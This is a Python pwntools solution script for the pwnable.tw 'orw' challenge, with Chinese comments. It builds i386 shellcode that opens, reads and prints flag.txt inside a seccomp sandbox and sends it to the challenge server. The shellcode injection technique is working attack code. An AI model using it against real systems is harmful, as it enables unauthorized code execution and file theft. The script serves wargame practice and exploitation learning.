#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""pwnable.tw 10000 "orw" —— seccomp 沙箱 + ORW shellcode

题目：32 位动态链接，先装 seccomp BPF，再把最多 0xc8 字节的 shellcode
      读到 .bss(0x804a060) 并 call 它。沙箱只放行：
      open(5) / read(3) / write(4) / exit(1) / exit_group(252) / sigreturn 系
      -> 拿不到 shell，只能 open("flag.txt") + read + write 把文件打出来。

保护：No PIE / NX 关闭（GNU_STACK=RWE）/ 有 canary / partial RELRO

关键：shellcode 里的缓冲区用栈（`sub esp,0x100`），不要用 .bss 之外未映射的地址。
"""

import sys

from pwn import *

context(os="linux", arch="i386", log_level="info")

BIN = "./orw"
LOCAL_BIN = "./orw_local_exec"
HOST, PORT = "chall.pwnable.tw", 10000

SHELLCODE_ADDR = 0x804A060
SHELLCODE_MAX = 0xC8


def build_shellcode() -> bytes:
    return asm(
        """
        /* open("flag.txt", O_RDONLY) */
        xor eax, eax
        push eax                 /* 字符串结尾的 \\0 */
        push 0x7478742e          /* "txt." */
        push 0x67616c66          /* "flag" */
        mov ebx, esp
        xor ecx, ecx
        mov al, 5                /* __NR_open */
        int 0x80

        /* read(fd, buf, 0x100) */
        mov ebx, eax
        sub esp, 0x100
        mov ecx, esp
        xor eax, eax
        mov al, 3                /* __NR_read */
        mov edx, 0x100
        int 0x80

        /* write(1, buf, 0x100) */
        xor eax, eax
        xor ebx, ebx
        inc ebx                  /* fd = 1 */
        mov al, 4                /* __NR_write */
        int 0x80
        """,
        arch="i386",
    )


def start() -> tube:
    if len(sys.argv) > 1 and sys.argv[1].upper() == "REMOTE":
        return remote(HOST, PORT)
    # 本机没有 32 位 loader，默认用 /tmp/libc32 里的 i386 ld-linux.so.2
    ld = os.getenv("I386_LD", "/tmp/libc32/root/usr/lib32/ld-linux.so.2")
    libpath = os.getenv("I386_LIBPATH", "/tmp/libc32/root/usr/lib32")
    # 本地必须用"段可执行"补丁版（见 make_local_exec.py），原版 orw 保留给远程
    binpath = LOCAL_BIN if os.path.exists(LOCAL_BIN) else BIN
    if os.path.exists(ld):
        return process([ld, "--library-path", libpath, binpath])
    return process(binpath)


def pwn() -> None:
    sc = build_shellcode()
    assert len(sc) <= SHELLCODE_MAX, len(sc)
    log.info("shellcode: %d bytes (max %d)", len(sc), SHELLCODE_MAX)

    io = start()
    io.recvuntil(b"Give my your shellcode:")
    io.send(sc)
    print(io.recvrepeat(1.5).decode(errors="replace"))
    io.close()


if __name__ == "__main__":
    pwn()
